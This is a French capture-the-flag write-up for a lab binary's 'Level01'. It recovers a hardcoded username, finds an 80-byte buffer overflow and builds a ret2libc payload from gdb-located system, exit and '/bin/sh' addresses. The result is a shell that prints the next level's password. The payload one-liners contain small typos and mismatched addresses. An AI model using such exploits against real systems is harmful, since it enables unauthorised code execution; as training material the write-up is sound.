## Level01

Lorsqu’on lance le programme, celui-ci nous demande un login.

On ouvre le programme sur cutter, on trouve que  verify_user_name(); est appelée.

On cherche donc dans cette fonction et on trouve une string : “dat_wil”. On essaie alors d’entrer cette string en tant qu’username et cela nous permet d’accéder au champ password.

On voit dans cutter une string “admin” qui est comparée. On essaie alors d’entrer “admin” en password, mais ça ne fonctionne pas.

Essayons de buffer overflow le fgets du password :

    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

    Program received signal SIGSEGV, Segmentation fault.
    0x37634136 in ?? ()

0x37634136 nous donne un offset de 80.

Le problème c’est qu’on ne voit pas de /bin/sh dans le programme. On va donc essayer de la trouver avec une ret2libc attack.

    (gdb) b *main+173
    Breakpoint 1 at 0x804857d
    
    (gdb) info proc map
    process 1857
    Mapped address spaces:
    Start Addr End Addr Size Offset objfile
    0x8048000 0x8049000 0x1000 0x0 /home/users/level01/level01
    0x8049000 0x804a000 0x1000 0x0 /home/users/level01/level01
    0x804a000 0x804b000 0x1000 0x1000 /home/users/level01/level01
    0xf7e2b000 0xf7e2c000 0x1000 0x0
    0xf7e2c000 0xf7fcc000 0x1a0000 0x0 /lib32/libc-2.15.so
    0xf7fcc000 0xf7fcd000 0x1000 0x1a0000 /lib32/libc-2.15.so
    0xf7fcd000 0xf7fcf000 0x2000 0x1a0000 /lib32/libc-2.15.so
    0xf7fcf000 0xf7fd0000 0x1000 0x1a2000 /lib32/libc-2.15.so
    0xf7fd0000 0xf7fd4000 0x4000 0x0
    0xf7fd8000 0xf7fdb000 0x3000 0x0
    0xf7fdb000 0xf7fdc000 0x1000 0x0 [vdso]
    0xf7fdc000 0xf7ffc000  0x20000 0x0 /lib32/ld-2.15.so
    0xf7ffc000 0xf7ffd000 0x1000  0x1f000 /lib32/ld-2.15.so
    0xf7ffd000 0xf7ffe000 0x1000  0x20000 /lib32/ld-2.15.so
    0xfffdd000 0xffffe000  0x21000 0x0 [stack]

    (gdb) find 0xf7e2b000, 0xf7fcc000,"bin/sh"
    (gdb) 0xf7f897ec
		1 pattern found.

Ici nous cherchons /bin/sh entre les adresses  **0xf7e2b000** et **0xf7ffdd00** grâce à gdb on trouve que /bin/sh se trouve à l'adresse : **0xf7f897ec**


    (gdb) info function system
    All functions matching regular expression "system":
   
    Non-debugging symbols:
    0xf7e6aed0  __libc_system
    0xf7e6aed0  system
    0xf7f48a50  svcerr_systemerr

On prend donc l'adresse de libc_system : **0xf7e6aed0**

    (gdb) info function exit
    All functions matching regular expression "exit":
    
    Non-debugging symbols:
    0xf7e5eb70  exit
    0xf7e5eba0  on_exit
    0xf7e5edb0  __cxa_atexit
    0xf7e5ef50  quick_exit
    0xf7e5ef80  __cxa_at_quick_exit
    0xf7ee45c4  _exit
    0xf7f27ec0  pthread_exit
    0xf7f2d4f0  __cyg_profile_func_exit
    0xf7f4bc30  svc_exit
    0xf7f55d80  atexit
Ici nous prenons l'adresse de l'exit : **0xf7e5eb70**

A partir de là nous pouvons créer notre payload :

*Overflow + System + Exit + /bin/sh*

Ce qui nous donne : 

    $ python -c "print 'A' * 80 + '\xd0\xae\xe6\xf7 + '\x70\xeb\xe5\xf7' + '\xed\x97\xf8\xf7'" > /tmp/payload

On ajoute alors la première commande pour accéder au password ce qui nous donne : 

    $ python -c "print 'dat_will' + '\n' + 'A' * 80 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7' " > /tmp/payload

    cat /tmp/payload - | ./level01
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: verifying username....
    
    Enter Password:
    nope, incorrect password...

    $ whoami
    level02
    $ cat /home/users/level02/.pass
    PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
